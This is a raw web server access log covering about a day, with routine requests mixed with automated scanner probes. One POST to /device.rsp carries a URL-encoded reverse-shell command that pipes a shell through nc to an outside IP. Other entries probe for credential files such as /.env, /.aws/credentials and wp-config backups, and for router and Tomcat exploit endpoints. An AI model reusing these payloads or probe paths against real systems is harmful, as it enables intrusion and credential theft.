nohup: ignoring input
 INFO  Accepting connections at http://localhost:8080
 HTTP  9/9/2025 2:21:49 PM 127.0.0.1 GET /
 HTTP  9/9/2025 2:21:49 PM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/9/2025 3:12:13 PM 127.0.0.1 GET /
 HTTP  9/9/2025 3:12:13 PM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/9/2025 3:15:15 PM 170.239.78.168 GET /
 HTTP  9/9/2025 3:15:15 PM 170.239.78.168 Returned 200 in 1 ms
 HTTP  9/9/2025 3:25:47 PM 170.64.154.131 GET /aaa9
 HTTP  9/9/2025 3:25:47 PM 170.64.154.131 Returned 200 in 1 ms
 HTTP  9/9/2025 3:25:51 PM 170.64.154.131 GET /aab8
 HTTP  9/9/2025 3:25:51 PM 170.64.154.131 Returned 200 in 1 ms
 HTTP  9/9/2025 3:25:54 PM 170.64.154.131 GET /
 HTTP  9/9/2025 3:25:54 PM 170.64.154.131 Returned 200 in 1 ms
 HTTP  9/9/2025 4:41:55 PM 45.135.193.253 GET /
 HTTP  9/9/2025 4:41:55 PM 45.135.193.253 Returned 200 in 1 ms
 HTTP  9/9/2025 5:13:51 PM 205.210.31.198 GET /
 HTTP  9/9/2025 5:13:51 PM 205.210.31.198 Returned 200 in 1 ms
 HTTP  9/9/2025 5:26:15 PM 194.187.176.2 GET /
 HTTP  9/9/2025 5:26:15 PM 194.187.176.2 Returned 200 in 1 ms
 HTTP  9/9/2025 5:26:15 PM 194.187.176.113 GET /favicon.ico
 HTTP  9/9/2025 5:26:15 PM 194.187.176.113 Returned 200 in 1 ms
 HTTP  9/9/2025 6:33:07 PM 172.69.109.53 GET /
 HTTP  9/9/2025 6:33:07 PM 172.69.109.53 Returned 200 in 1 ms
 HTTP  9/9/2025 7:05:32 PM 196.251.84.66 POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=mkfifo%20%2Ftmp%2Ff%3B%20%2Fbin%2Fsh%20-i%20%3C%20%2Ftmp%2Ff%202%3E%261%20%7C%20nc%20196.251.84.66%206667%20%3E%20%2Ftmp%2Ff
 HTTP  9/9/2025 7:05:32 PM 196.251.84.66 Returned 200 in 1 ms
 HTTP  9/9/2025 7:10:15 PM 198.235.24.135 GET /
 HTTP  9/9/2025 7:10:15 PM 198.235.24.135 Returned 200 in 1 ms
 HTTP  9/9/2025 7:29:29 PM 127.0.0.1 GET /
 HTTP  9/9/2025 7:29:29 PM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/9/2025 7:31:52 PM 204.76.203.233 GET http://apiv4.9hits.com/test
 HTTP  9/9/2025 7:31:52 PM 204.76.203.233 Returned 200 in 1 ms
 HTTP  9/9/2025 7:36:40 PM 127.0.0.1 GET /favicon.ico
 HTTP  9/9/2025 7:36:40 PM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/9/2025 7:44:26 PM 45.135.193.253 GET /
 HTTP  9/9/2025 7:44:26 PM 45.135.193.253 Returned 200 in 1 ms
 HTTP  9/9/2025 8:06:14 PM 206.168.34.93 GET /
 HTTP  9/9/2025 8:06:14 PM 206.168.34.93 Returned 200 in 1 ms
 HTTP  9/9/2025 8:16:30 PM 79.124.58.198 GET /?XDEBUG_SESSION_START=phpstorm
 HTTP  9/9/2025 8:16:30 PM 79.124.58.198 Returned 200 in 1 ms
 HTTP  9/9/2025 8:54:13 PM 79.124.58.198 GET /actuator/gateway/routes
 HTTP  9/9/2025 8:54:13 PM 79.124.58.198 Returned 200 in 1 ms
 HTTP  9/9/2025 10:42:37 PM 92.42.201.26 GET http://ip-api.com/json/
 HTTP  9/9/2025 10:42:37 PM 92.42.201.26 Returned 200 in 1 ms
 HTTP  9/9/2025 10:45:31 PM 157.245.77.56 GET /
 HTTP  9/9/2025 10:45:31 PM 157.245.77.56 Returned 200 in 1 ms
 HTTP  9/9/2025 10:52:19 PM 45.135.193.253 GET /
 HTTP  9/9/2025 10:52:19 PM 45.135.193.253 Returned 200 in 2 ms
 HTTP  9/9/2025 11:02:29 PM 127.0.0.1 GET /
 HTTP  9/9/2025 11:02:29 PM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/9/2025 11:02:31 PM 127.0.0.1 GET /favicon.ico
 HTTP  9/9/2025 11:02:31 PM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/9/2025 11:02:55 PM 127.0.0.1 GET /favicon.ico
 HTTP  9/9/2025 11:02:55 PM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/10/2025 12:12:48 AM 23.225.178.154 GET /
 HTTP  9/10/2025 12:12:48 AM 23.225.178.154 Returned 200 in 1 ms
 HTTP  9/10/2025 12:12:59 AM 45.38.44.221 GET /login
 HTTP  9/10/2025 12:12:59 AM 45.38.44.221 Returned 200 in 1 ms
 HTTP  9/10/2025 12:14:52 AM 176.65.149.165 POST /goform/set_LimitClient_cfg
 HTTP  9/10/2025 12:14:52 AM 176.65.149.165 Returned 200 in 0 ms
 HTTP  9/10/2025 12:26:44 AM 127.0.0.1 GET /
 HTTP  9/10/2025 12:26:44 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/10/2025 12:26:45 AM 127.0.0.1 GET /favicon.ico
 HTTP  9/10/2025 12:26:45 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/10/2025 12:26:45 AM 127.0.0.1 GET /favicon.ico
 HTTP  9/10/2025 12:26:45 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/10/2025 12:54:14 AM 80.75.212.83 GET /
 HTTP  9/10/2025 12:54:14 AM 80.75.212.83 Returned 200 in 1 ms
 HTTP  9/10/2025 12:57:27 AM 3.94.162.205 GET /
 HTTP  9/10/2025 12:57:27 AM 3.94.162.205 Returned 200 in 1 ms
 HTTP  9/10/2025 1:09:22 AM 127.0.0.1 GET /.git/config
 HTTP  9/10/2025 1:09:22 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/10/2025 1:24:18 AM 45.135.193.253 GET /
 HTTP  9/10/2025 1:24:18 AM 45.135.193.253 Returned 200 in 1 ms
 HTTP  9/10/2025 1:42:38 AM 80.75.212.83 GET /
 HTTP  9/10/2025 1:42:38 AM 80.75.212.83 Returned 200 in 1 ms
 HTTP  9/10/2025 1:44:22 AM 116.148.92.167 GET /
 HTTP  9/10/2025 1:44:22 AM 116.148.92.167 Returned 200 in 3 ms
 HTTP  9/10/2025 1:44:45 AM 124.31.105.243 GET /
 HTTP  9/10/2025 1:44:45 AM 124.31.105.243 Returned 200 in 1 ms
 HTTP  9/10/2025 1:44:46 AM 111.224.219.45 GET /favicon.ico
 HTTP  9/10/2025 1:44:46 AM 111.224.219.45 Returned 200 in 1 ms
 HTTP  9/10/2025 1:57:40 AM 146.0.211.48 GET /
 HTTP  9/10/2025 1:57:40 AM 146.0.211.48 Returned 200 in 1 ms
 HTTP  9/10/2025 2:44:54 AM 20.64.104.154 GET /manager/text/list
 HTTP  9/10/2025 2:44:54 AM 20.64.104.154 Returned 200 in 1 ms
 HTTP  9/10/2025 2:59:36 AM 205.210.31.234 GET /
 HTTP  9/10/2025 2:59:36 AM 205.210.31.234 Returned 200 in 1 ms
 HTTP  9/10/2025 3:33:20 AM 196.251.72.5 HEAD /
 HTTP  9/10/2025 3:33:20 AM 196.251.72.5 Returned 200 in 1 ms
 HTTP  9/10/2025 3:33:57 AM 196.251.72.5 HEAD /
 HTTP  9/10/2025 3:33:57 AM 196.251.72.5 Returned 200 in 1 ms
 HTTP  9/10/2025 3:33:58 AM 196.251.72.5 GET /.env
 HTTP  9/10/2025 3:33:58 AM 196.251.72.5 Returned 200 in 1 ms
 HTTP  9/10/2025 3:33:58 AM 196.251.72.5 HEAD /
 HTTP  9/10/2025 3:33:58 AM 196.251.72.5 Returned 200 in 1 ms
 HTTP  9/10/2025 3:33:59 AM 196.251.72.5 GET /.env.dev
 HTTP  9/10/2025 3:33:59 AM 196.251.72.5 Returned 200 in 1 ms
 HTTP  9/10/2025 3:33:59 AM 196.251.72.5 HEAD /
 HTTP  9/10/2025 3:33:59 AM 196.251.72.5 Returned 200 in 1 ms
 HTTP  9/10/2025 3:34:00 AM 196.251.72.5 GET /.env.prod
 HTTP  9/10/2025 3:34:00 AM 196.251.72.5 Returned 200 in 1 ms
 HTTP  9/10/2025 3:34:01 AM 196.251.72.5 HEAD /
 HTTP  9/10/2025 3:34:01 AM 196.251.72.5 Returned 200 in 1 ms
 HTTP  9/10/2025 3:34:01 AM 196.251.72.5 GET /.aws/config
 HTTP  9/10/2025 3:34:01 AM 196.251.72.5 Returned 200 in 1 ms
 HTTP  9/10/2025 3:34:02 AM 196.251.72.5 HEAD /
 HTTP  9/10/2025 3:34:02 AM 196.251.72.5 Returned 200 in 1 ms
 HTTP  9/10/2025 3:34:02 AM 196.251.72.5 GET /.aws/credentials
 HTTP  9/10/2025 3:34:02 AM 196.251.72.5 Returned 200 in 1 ms
 HTTP  9/10/2025 3:34:03 AM 196.251.72.5 HEAD /
 HTTP  9/10/2025 3:34:03 AM 196.251.72.5 Returned 200 in 0 ms
 HTTP  9/10/2025 3:34:03 AM 196.251.72.5 GET /sendgrid.env
 HTTP  9/10/2025 3:34:03 AM 196.251.72.5 Returned 200 in 2 ms
 HTTP  9/10/2025 3:34:04 AM 196.251.72.5 HEAD /
 HTTP  9/10/2025 3:34:04 AM 196.251.72.5 Returned 200 in 1 ms
 HTTP  9/10/2025 3:34:05 AM 196.251.72.5 GET /?pp=env
 HTTP  9/10/2025 3:34:05 AM 196.251.72.5 Returned 200 in 1 ms
 HTTP  9/10/2025 3:34:05 AM 196.251.72.5 HEAD /
 HTTP  9/10/2025 3:34:05 AM 196.251.72.5 Returned 200 in 1 ms
 HTTP  9/10/2025 3:34:06 AM 196.251.72.5 GET /config.json
 HTTP  9/10/2025 3:34:06 AM 196.251.72.5 Returned 200 in 1 ms
 HTTP  9/10/2025 3:34:06 AM 196.251.72.5 HEAD /
 HTTP  9/10/2025 3:34:06 AM 196.251.72.5 Returned 200 in 1 ms
 HTTP  9/10/2025 3:34:07 AM 196.251.72.5 GET /docker-compose.yml
 HTTP  9/10/2025 3:34:07 AM 196.251.72.5 Returned 200 in 1 ms
 HTTP  9/10/2025 3:34:08 AM 196.251.72.5 HEAD /
 HTTP  9/10/2025 3:34:08 AM 196.251.72.5 Returned 200 in 1 ms
 HTTP  9/10/2025 3:34:08 AM 196.251.72.5 GET /_debugbar/open?max=20&offset=0
 HTTP  9/10/2025 3:34:08 AM 196.251.72.5 Returned 200 in 1 ms
 HTTP  9/10/2025 3:34:09 AM 196.251.72.5 HEAD /
 HTTP  9/10/2025 3:34:09 AM 196.251.72.5 Returned 200 in 1 ms
 HTTP  9/10/2025 3:34:09 AM 196.251.72.5 GET /debug/vars
 HTTP  9/10/2025 3:34:09 AM 196.251.72.5 Returned 200 in 1 ms
 HTTP  9/10/2025 3:34:10 AM 196.251.72.5 HEAD /
 HTTP  9/10/2025 3:34:10 AM 196.251.72.5 Returned 200 in 1 ms
 HTTP  9/10/2025 3:34:10 AM 196.251.72.5 GET /app_dev.php/?open=file=app/config/parameters.yml
 HTTP  9/10/2025 3:34:10 AM 196.251.72.5 Returned 200 in 1 ms
 HTTP  9/10/2025 3:34:11 AM 196.251.72.5 HEAD /
 HTTP  9/10/2025 3:34:11 AM 196.251.72.5 Returned 200 in 1 ms
 HTTP  9/10/2025 3:34:13 AM 196.251.72.5 GET /application/configs/application.ini
 HTTP  9/10/2025 3:34:13 AM 196.251.72.5 Returned 200 in 2 ms
 HTTP  9/10/2025 3:34:13 AM 196.251.72.5 HEAD /
 HTTP  9/10/2025 3:34:13 AM 196.251.72.5 Returned 200 in 0 ms
 HTTP  9/10/2025 3:34:14 AM 196.251.72.5 GET /app/config/parameters.yml
 HTTP  9/10/2025 3:34:14 AM 196.251.72.5 Returned 200 in 1 ms
 HTTP  9/10/2025 3:34:14 AM 196.251.72.5 HEAD /
 HTTP  9/10/2025 3:34:14 AM 196.251.72.5 Returned 200 in 1 ms
 HTTP  9/10/2025 3:34:15 AM 196.251.72.5 GET /appsettings.json
 HTTP  9/10/2025 3:34:15 AM 196.251.72.5 Returned 200 in 1 ms
 HTTP  9/10/2025 3:34:16 AM 196.251.72.5 HEAD /
 HTTP  9/10/2025 3:34:16 AM 196.251.72.5 Returned 200 in 1 ms
 HTTP  9/10/2025 3:34:16 AM 196.251.72.5 GET /cgi-bin/printenv.pl
 HTTP  9/10/2025 3:34:16 AM 196.251.72.5 Returned 200 in 1 ms
 HTTP  9/10/2025 3:34:17 AM 196.251.72.5 HEAD /
 HTTP  9/10/2025 3:34:17 AM 196.251.72.5 Returned 200 in 1 ms
 HTTP  9/10/2025 3:34:17 AM 196.251.72.5 GET /wp-config.php.backup
 HTTP  9/10/2025 3:34:17 AM 196.251.72.5 Returned 200 in 1 ms
 HTTP  9/10/2025 4:00:19 AM 190.152.10.124 GET /
 HTTP  9/10/2025 4:00:19 AM 190.152.10.124 Returned 200 in 1 ms
 HTTP  9/10/2025 4:40:42 AM 45.135.193.253 GET /
 HTTP  9/10/2025 4:40:42 AM 45.135.193.253 Returned 200 in 1 ms
 HTTP  9/10/2025 5:47:07 AM 87.236.176.169 GET /
 HTTP  9/10/2025 5:47:07 AM 87.236.176.169 Returned 200 in 1 ms
 HTTP  9/10/2025 5:47:08 AM 185.247.137.232 GET /favicon.ico
 HTTP  9/10/2025 5:47:08 AM 185.247.137.232 Returned 200 in 1 ms
 HTTP  9/10/2025 6:01:42 AM 101.36.105.121 GET /
 HTTP  9/10/2025 6:01:42 AM 101.36.105.121 Returned 200 in 1 ms
 HTTP  9/10/2025 6:06:09 AM 20.169.48.140 GET /
 HTTP  9/10/2025 6:06:09 AM 20.169.48.140 Returned 200 in 1 ms
 HTTP  9/10/2025 6:27:08 AM 185.247.137.138 GET /
 HTTP  9/10/2025 6:27:08 AM 185.247.137.138 Returned 200 in 1 ms
 HTTP  9/10/2025 6:27:10 AM 185.247.137.146 GET /favicon.ico
 HTTP  9/10/2025 6:27:10 AM 185.247.137.146 Returned 200 in 1 ms
 HTTP  9/10/2025 6:41:14 AM 127.0.0.1 GET /
 HTTP  9/10/2025 6:41:14 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/10/2025 6:41:16 AM 127.0.0.1 GET //xmlrpc.php?rsd
 HTTP  9/10/2025 6:41:16 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/10/2025 6:41:18 AM 127.0.0.1 GET //blog/wp-includes/wlwmanifest.xml
 HTTP  9/10/2025 6:41:18 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/10/2025 6:41:20 AM 127.0.0.1 GET //wordpress/wp-includes/wlwmanifest.xml
 HTTP  9/10/2025 6:41:20 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/10/2025 6:41:21 AM 127.0.0.1 GET //wp/wp-includes/wlwmanifest.xml
 HTTP  9/10/2025 6:41:21 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/10/2025 6:41:23 AM 127.0.0.1 GET //2018/wp-includes/wlwmanifest.xml
 HTTP  9/10/2025 6:41:23 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/10/2025 6:41:25 AM 127.0.0.1 GET //shop/wp-includes/wlwmanifest.xml
 HTTP  9/10/2025 6:41:25 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/10/2025 6:41:27 AM 127.0.0.1 GET //test/wp-includes/wlwmanifest.xml
 HTTP  9/10/2025 6:41:27 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/10/2025 6:41:29 AM 127.0.0.1 GET //wp2/wp-includes/wlwmanifest.xml
 HTTP  9/10/2025 6:41:29 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/10/2025 6:41:31 AM 127.0.0.1 GET //cms/wp-includes/wlwmanifest.xml
 HTTP  9/10/2025 6:41:31 AM 127.0.0.1 Returned 200 in 2 ms
 HTTP  9/10/2025 6:41:38 AM 205.210.31.50 GET /
 HTTP  9/10/2025 6:41:38 AM 205.210.31.50 Returned 200 in 1 ms
 HTTP  9/10/2025 6:51:55 AM 198.235.24.152 GET /
 HTTP  9/10/2025 6:51:55 AM 198.235.24.152 Returned 200 in 1 ms
 HTTP  9/10/2025 6:53:26 AM 127.0.0.1 GET /.git/config
 HTTP  9/10/2025 6:53:26 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/10/2025 7:43:48 AM 127.0.0.1 GET /
 HTTP  9/10/2025 7:43:48 AM 127.0.0.1 Returned 200 in 2 ms
 HTTP  9/10/2025 7:43:55 AM 127.0.0.1 GET /favicon.ico
 HTTP  9/10/2025 7:43:55 AM 127.0.0.1 Returned 200 in 2 ms
 HTTP  9/10/2025 7:55:02 AM 45.135.193.253 GET /
 HTTP  9/10/2025 7:55:02 AM 45.135.193.253 Returned 200 in 1 ms
 HTTP  9/10/2025 8:30:10 AM 176.65.148.99 POST /login
 HTTP  9/10/2025 8:30:10 AM 176.65.148.99 Returned 200 in 1 ms
 HTTP  9/10/2025 9:03:14 AM 165.154.125.234 GET /v1/vector/collections/describe
 HTTP  9/10/2025 9:03:14 AM 165.154.125.234 Returned 200 in 1 ms
 HTTP  9/10/2025 9:03:14 AM 165.154.125.234 GET /v1
 HTTP  9/10/2025 9:03:14 AM 165.154.125.234 Returned 200 in 1 ms
 HTTP  9/10/2025 9:03:14 AM 165.154.125.234 GET /
 HTTP  9/10/2025 9:03:14 AM 165.154.125.234 Returned 200 in 1 ms
 HTTP  9/10/2025 9:03:20 AM 101.36.118.228 GET /
 HTTP  9/10/2025 9:03:20 AM 101.36.118.228 Returned 200 in 1 ms
 HTTP  9/10/2025 9:03:21 AM 101.36.118.228 GET /favicon.ico
 HTTP  9/10/2025 9:03:21 AM 101.36.118.228 Returned 200 in 1 ms
 HTTP  9/10/2025 9:03:21 AM 101.36.118.228 GET /favicon.ico
 HTTP  9/10/2025 9:03:21 AM 101.36.118.228 Returned 200 in 1 ms
 HTTP  9/10/2025 9:03:21 AM 101.36.118.228 GET /js/chunk-vendors.0059c332.js
 HTTP  9/10/2025 9:03:21 AM 101.36.118.228 Returned 200 in 1 ms
 HTTP  9/10/2025 9:03:22 AM 101.36.118.228 GET /js/app.e2f12930.js
 HTTP  9/10/2025 9:03:22 AM 101.36.118.228 Returned 200 in 1 ms
 HTTP  9/10/2025 9:03:22 AM 13.244.120.243 GET /
 HTTP  9/10/2025 9:03:22 AM 13.244.120.243 Returned 200 in 1 ms
 HTTP  9/10/2025 9:07:16 AM 127.0.0.1 GET /
 HTTP  9/10/2025 9:07:16 AM 127.0.0.1 Returned 200 in 2 ms
 HTTP  9/10/2025 9:08:33 AM 127.0.0.1 GET /
 HTTP  9/10/2025 9:08:33 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/10/2025 9:08:35 AM 127.0.0.1 GET //xmlrpc.php?rsd
 HTTP  9/10/2025 9:08:35 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/10/2025 9:08:36 AM 127.0.0.1 GET //blog/wp-includes/wlwmanifest.xml
 HTTP  9/10/2025 9:08:36 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/10/2025 9:08:38 AM 127.0.0.1 GET //wordpress/wp-includes/wlwmanifest.xml
 HTTP  9/10/2025 9:08:38 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/10/2025 9:08:39 AM 127.0.0.1 GET //wp/wp-includes/wlwmanifest.xml
 HTTP  9/10/2025 9:08:39 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/10/2025 9:08:41 AM 127.0.0.1 GET //2018/wp-includes/wlwmanifest.xml
 HTTP  9/10/2025 9:08:41 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/10/2025 9:08:42 AM 127.0.0.1 GET //shop/wp-includes/wlwmanifest.xml
 HTTP  9/10/2025 9:08:42 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/10/2025 9:08:44 AM 127.0.0.1 GET //test/wp-includes/wlwmanifest.xml
 HTTP  9/10/2025 9:08:44 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/10/2025 9:08:45 AM 127.0.0.1 GET //wp2/wp-includes/wlwmanifest.xml
 HTTP  9/10/2025 9:08:45 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/10/2025 9:08:47 AM 127.0.0.1 GET //cms/wp-includes/wlwmanifest.xml
 HTTP  9/10/2025 9:08:47 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/10/2025 10:12:59 AM 94.72.105.101 GET /
 HTTP  9/10/2025 10:12:59 AM 94.72.105.101 Returned 200 in 1 ms
 HTTP  9/10/2025 10:36:55 AM 45.135.193.253 GET /
 HTTP  9/10/2025 10:36:55 AM 45.135.193.253 Returned 200 in 1 ms
 HTTP  9/10/2025 10:40:12 AM 165.227.69.246 GET /
 HTTP  9/10/2025 10:40:12 AM 165.227.69.246 Returned 200 in 1 ms
 HTTP  9/10/2025 10:40:12 AM 165.227.69.246 GET /download/powershell/
 HTTP  9/10/2025 10:40:12 AM 165.227.69.246 Returned 200 in 1 ms
 HTTP  9/10/2025 10:40:13 AM 165.227.69.246 GET /get.php
 HTTP  9/10/2025 10:40:13 AM 165.227.69.246 Returned 200 in 1 ms
 HTTP  9/10/2025 11:19:25 AM 127.0.0.1 GET /
 HTTP  9/10/2025 11:19:25 AM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/10/2025 12:13:13 PM 164.92.254.129 GET /
 HTTP  9/10/2025 12:13:13 PM 164.92.254.129 Returned 200 in 1 ms
 HTTP  9/10/2025 12:14:52 PM 172.68.205.225 GET /
 HTTP  9/10/2025 12:14:52 PM 172.68.205.225 Returned 200 in 1 ms
 HTTP  9/10/2025 12:14:53 PM 172.68.205.207 GET /favicon.ico
 HTTP  9/10/2025 12:14:53 PM 172.68.205.207 Returned 200 in 1 ms
 HTTP  9/10/2025 12:45:53 PM 64.62.156.66 GET /
 HTTP  9/10/2025 12:45:53 PM 64.62.156.66 Returned 200 in 1 ms
 HTTP  9/10/2025 12:46:36 PM 64.62.156.78 GET /favicon.ico
 HTTP  9/10/2025 12:46:36 PM 64.62.156.78 Returned 200 in 1 ms
 HTTP  9/10/2025 12:46:55 PM 64.62.156.70 GET http://api.ipify.org/?format=json
 HTTP  9/10/2025 12:46:55 PM 64.62.156.70 Returned 200 in 1 ms
 HTTP  9/10/2025 12:47:12 PM 64.62.156.66 GET /geoserver/web/
 HTTP  9/10/2025 12:47:12 PM 64.62.156.66 Returned 200 in 1 ms
 HTTP  9/10/2025 1:15:57 PM 127.0.0.1 GET /
 HTTP  9/10/2025 1:15:57 PM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/10/2025 1:15:58 PM 127.0.0.1 GET //xmlrpc.php?rsd
 HTTP  9/10/2025 1:15:58 PM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/10/2025 1:16:00 PM 127.0.0.1 GET //blog/wp-includes/wlwmanifest.xml
 HTTP  9/10/2025 1:16:00 PM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/10/2025 1:16:01 PM 127.0.0.1 GET //wordpress/wp-includes/wlwmanifest.xml
 HTTP  9/10/2025 1:16:01 PM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/10/2025 1:16:02 PM 127.0.0.1 GET //wp/wp-includes/wlwmanifest.xml
 HTTP  9/10/2025 1:16:02 PM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/10/2025 1:16:04 PM 127.0.0.1 GET //2020/wp-includes/wlwmanifest.xml
 HTTP  9/10/2025 1:16:04 PM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/10/2025 1:16:05 PM 127.0.0.1 GET //shop/wp-includes/wlwmanifest.xml
 HTTP  9/10/2025 1:16:05 PM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/10/2025 1:16:06 PM 127.0.0.1 GET //test/wp-includes/wlwmanifest.xml
 HTTP  9/10/2025 1:16:06 PM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/10/2025 1:16:08 PM 127.0.0.1 GET //site/wp-includes/wlwmanifest.xml
 HTTP  9/10/2025 1:16:08 PM 127.0.0.1 Returned 200 in 2 ms
 HTTP  9/10/2025 1:16:09 PM 127.0.0.1 GET //sito/wp-includes/wlwmanifest.xml
 HTTP  9/10/2025 1:16:09 PM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/10/2025 1:34:04 PM 94.72.105.101 GET /geoserver/web/wicket/bookmarkable/org.geoserver.web.AboutGeoServerPage
 HTTP  9/10/2025 1:34:04 PM 94.72.105.101 Returned 200 in 1 ms
 HTTP  9/10/2025 1:44:47 PM 45.135.193.253 GET /
 HTTP  9/10/2025 1:44:47 PM 45.135.193.253 Returned 200 in 1 ms
 HTTP  9/10/2025 2:04:50 PM 127.0.0.1 GET /
 HTTP  9/10/2025 2:04:50 PM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/10/2025 2:04:59 PM 127.0.0.1 GET //cdn.js
 HTTP  9/10/2025 2:04:59 PM 127.0.0.1 Returned 200 in 2 ms
 HTTP  9/10/2025 2:04:59 PM 127.0.0.1 GET /js/chunk-vendors.0059c332.js
 HTTP  9/10/2025 2:04:59 PM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/10/2025 2:05:01 PM 127.0.0.1 GET /js/app.e2f12930.js
 HTTP  9/10/2025 2:05:01 PM 127.0.0.1 Returned 200 in 9 ms
 HTTP  9/10/2025 2:22:19 PM 59.183.143.73 GET /
 HTTP  9/10/2025 2:22:19 PM 59.183.143.73 Returned 200 in 1 ms
 HTTP  9/10/2025 3:29:22 PM 127.0.0.1 GET /
 HTTP  9/10/2025 3:29:22 PM 127.0.0.1 Returned 200 in 1 ms
 HTTP  9/10/2025 3:36:56 PM 172.69.136.176 GET /
 HTTP  9/10/2025 3:36:56 PM 172.69.136.176 Returned 200 in 1 ms
 HTTP  9/10/2025 3:36:57 PM 172.69.136.216 GET /favicon.ico
 HTTP  9/10/2025 3:36:57 PM 172.69.136.216 Returned 200 in 1 ms
 HTTP  9/10/2025 4:00:23 PM 45.135.193.253 GET /
 HTTP  9/10/2025 4:00:23 PM 45.135.193.253 Returned 200 in 1 ms
 HTTP  9/10/2025 4:35:27 PM 20.64.104.143 GET /manager/html
 HTTP  9/10/2025 4:35:27 PM 20.64.104.143 Returned 200 in 1 ms
 HTTP  9/10/2025 4:54:22 PM 27.47.3.56 POST /GponForm/diag_Form?images/
 HTTP  9/10/2025 4:54:22 PM 27.47.3.56 Returned 200 in 1 ms
 HTTP  9/10/2025 6:02:17 PM 217.154.201.105 GET /cgi-bin/main-cgi?json={%22cmd%22:%20116}&_=1757416340879
 HTTP  9/10/2025 6:02:17 PM 217.154.201.105 Returned 200 in 1 ms
 HTTP  9/10/2025 6:14:29 PM 92.42.201.26 GET http://ip-api.com/json/
 HTTP  9/10/2025 6:14:29 PM 92.42.201.26 Returned 200 in 1 ms
 HTTP  9/10/2025 7:01:06 PM 198.235.24.84 GET /
 HTTP  9/10/2025 7:01:06 PM 198.235.24.84 Returned 200 in 1 ms
 HTTP  9/10/2025 7:21:56 PM 45.135.193.253 GET /
 HTTP  9/10/2025 7:21:56 PM 45.135.193.253 Returned 200 in 1 ms
 HTTP  9/10/2025 7:27:27 PM 176.65.149.162 POST /goform/set_LimitClient_cfg
 HTTP  9/10/2025 7:27:27 PM 176.65.149.162 Returned 200 in 1 ms
 HTTP  9/10/2025 8:09:39 PM 185.247.137.57 GET /
 HTTP  9/10/2025 8:09:39 PM 185.247.137.57 Returned 200 in 1 ms
 HTTP  9/10/2025 8:09:39 PM 87.236.176.45 GET /favicon.ico
